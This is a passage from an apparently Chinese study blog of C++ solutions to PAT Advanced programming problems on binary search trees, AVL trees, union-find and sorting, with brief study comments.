<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        origin.push_back(temp);</span><br><span class="line">        insert(root,temp);</span><br><span class="line">    &#125;</span><br><span class="line">    preOrder(root,pre);</span><br><span class="line">    preOrderMirror(root,preM);</span><br><span class="line">    postOrder(root,post);</span><br><span class="line">    postOrderMirror(root,postM);</span><br><span class="line">    <span class="keyword">if</span>(origin==pre)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;post.size();i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,post[i]);</span><br><span class="line">            <span class="keyword">if</span>(i&lt;post.size()<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(origin==preM)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;postM.size();i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,postM[i]);</span><br><span class="line">            <span class="keyword">if</span>(i&lt;postM.size()<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1064</span></span><br><span class="line"><span class="comment">//这题要想到二叉排序树与中序遍历的关系，再结合数组才能想到</span></span><br><span class="line"><span class="comment">//先跟着答案理一下思路</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1010</span>;</span><br><span class="line"><span class="keyword">int</span> number[maxn];</span><br><span class="line"><span class="keyword">int</span> CBT[maxn];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> id=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(<span class="keyword">int</span> root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root&gt;n) <span class="keyword">return</span>;</span><br><span class="line">    inOrder(root*<span class="number">2</span>);</span><br><span class="line">    CBT[root]=number[id++];</span><br><span class="line">    inOrder(root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;number[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(number,number+n);</span><br><span class="line">    inOrder(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,CBT[i]);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;n) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1099</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">110</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;</span><br><span class="line">&#125;Node[maxn];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> in[maxn];</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(<span class="keyword">int</span> root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">    inOrder(Node[root].lchild);</span><br><span class="line">    Node[root].data=in[num++];</span><br><span class="line">    inOrder(Node[root].rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    q.push(root);</span><br><span class="line">    num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">        <span class="keyword">int</span> now=q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,Node[now].data);</span><br><span class="line">        num++;</span><br><span class="line">        <span class="keyword">if</span>(num&lt;n) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(Node[now].lchild!=<span class="number">-1</span>) q.push(Node[now].lchild);</span><br><span class="line">        <span class="keyword">if</span>(Node[now].rchild!=<span class="number">-1</span>) q.push(Node[now].rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;lchild,&amp;rchild);</span><br><span class="line">        Node[i].lchild=lchild;</span><br><span class="line">        Node[i].rchild=rchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;in[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(in,in+n);</span><br><span class="line">    inOrder(<span class="number">0</span>);</span><br><span class="line">    BFS(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-5"><a href="#9-5" class="headerlink" title="9.5"></a>9.5</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1066</span></span><br><span class="line"><span class="comment">//熟记相关AVL模板</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="keyword">int</span> height;</span><br><span class="line">    node *lchild,*rchild;</span><br><span class="line">&#125;*root;</span><br><span class="line"></span><br><span class="line"><span class="function">node* <span class="title">newNode</span><span class="params">(<span class="keyword">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node* Node=<span class="keyword">new</span> node;</span><br><span class="line">    Node-&gt;data=data;</span><br><span class="line">    Node-&gt;height=<span class="number">1</span>;</span><br><span class="line">    Node-&gt;lchild=Node-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> Node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHeight</span><span class="params">(node* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> root-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateHeight</span><span class="params">(node* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    root-&gt;height=max(getHeight(root-&gt;lchild),getHeight(root-&gt;rchild))+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getBalance</span><span class="params">(node* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getHeight(root-&gt;lchild)-getHeight(root-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//左旋</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">L</span><span class="params">(node* &amp;root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node* temp=root-&gt;rchild;</span><br><span class="line">    root-&gt;rchild=temp-&gt;lchild;</span><br><span class="line">    temp-&gt;lchild=root;</span><br><span class="line">    updateHeight(root);</span><br><span class="line">    updateHeight(temp);</span><br><span class="line">    root=temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//右旋</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">R</span><span class="params">(node* &amp;root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node* temp=root-&gt;lchild;</span><br><span class="line">    root-&gt;lchild=temp-&gt;rchild;</span><br><span class="line">    temp-&gt;rchild=root;</span><br><span class="line">    updateHeight(root);</span><br><span class="line">    updateHeight(temp);</span><br><span class="line">    root=temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(node* &amp;root,<span class="keyword">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        root=newNode(data);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(data&lt;root-&gt;data)&#123;</span><br><span class="line">        insert(root-&gt;lchild,data);</span><br><span class="line">        updateHeight(root);</span><br><span class="line">        <span class="keyword">if</span>(getBalance(root)==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(getBalance(root-&gt;lchild)==<span class="number">1</span>) R(root);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(getBalance(root-&gt;lchild)==<span class="number">-1</span>)&#123;</span><br><span class="line">                L(root-&gt;lchild);</span><br><span class="line">                R(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        insert(root-&gt;rchild,data);</span><br><span class="line">        updateHeight(root);</span><br><span class="line">        <span class="keyword">if</span>(getBalance(root)==<span class="number">-2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(getBalance(root-&gt;rchild)==<span class="number">-1</span>) L(root);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(getBalance(root-&gt;rchild)==<span class="number">1</span>)&#123;</span><br><span class="line">                R(root-&gt;rchild);</span><br><span class="line">                L(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,data;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">        insert(root,data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,root-&gt;data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-6"><a href="#9-6" class="headerlink" title="9.6"></a>9.6</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1107</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1010</span>;</span><br><span class="line"><span class="keyword">int</span> father[maxn];</span><br><span class="line"><span class="keyword">int</span> course[maxn]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> isRoot[maxn]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findFather</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> root=x;</span><br><span class="line">    <span class="comment">//寻找x的根节点，并存放在root</span></span><br><span class="line">    <span class="keyword">while</span>(root!=father[root])</span><br><span class="line">        root=father[root];</span><br><span class="line">    <span class="comment">//路径压缩</span></span><br><span class="line">    <span class="keyword">while</span>(x!=father[x])&#123;</span><br><span class="line">        <span class="keyword">int</span> temp=x;</span><br><span class="line">        x = father[x];</span><br><span class="line">        father[temp] = root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> faA = findFather(a);</span><br><span class="line">    <span class="keyword">int</span> faB = findFather(b);</span><br><span class="line">    <span class="keyword">if</span>(faA!=faB) father[faA]=faB;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        father[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k,h;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    init(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d:&quot;</span>,&amp;k);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;h);</span><br><span class="line">            <span class="keyword">if</span>(course[h]==<span class="number">0</span>)</span><br><span class="line">                course[h]=i;</span><br><span class="line">            Union(i,findFather(course[h]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        isRoot[findFather(i)]++;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(isRoot[i]!=<span class="number">0</span>)</span><br><span class="line">            ans++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    sort(isRoot+<span class="number">1</span>,isRoot+n+<span class="number">1</span>,cmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=ans;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,isRoot[i]);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;ans) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-7"><a href="#9-7" class="headerlink" title="9.7"></a>9.7</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1098</span></span><br><span class="line"><span class="comment">//自己写的只有23分，测试点2不通过</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">110</span>;</span><br><span class="line"><span class="keyword">int</span> changed[N];</span><br><span class="line"><span class="keyword">int</span> heap[N],insert2[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> b[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=b[i])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a[i]);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;n) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">insert_sort</span><span class="params">(<span class="keyword">int</span> insert2[],<span class="keyword">int</span> changed[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//insert sort需要n-1次交换</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=<span class="number">1</span>&amp;&amp;same(insert2,changed,n)) flag=<span class="literal">true</span>;</span><br><span class="line">        sort(insert2,insert2+i+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="literal">true</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">downjust</span><span class="params">(<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=low,j=i*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=high)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j+<span class="number">1</span>&lt;=high&amp;&amp;heap[j+<span class="number">1</span>]&gt;heap[j]) j=j+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(heap[j]&gt;heap[i])&#123;</span><br><span class="line">            swap(heap[j],heap[i]);</span><br><span class="line">            i=j;</span><br><span class="line">            j=i*<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_sort</span><span class="params">(<span class="keyword">int</span> heap[],<span 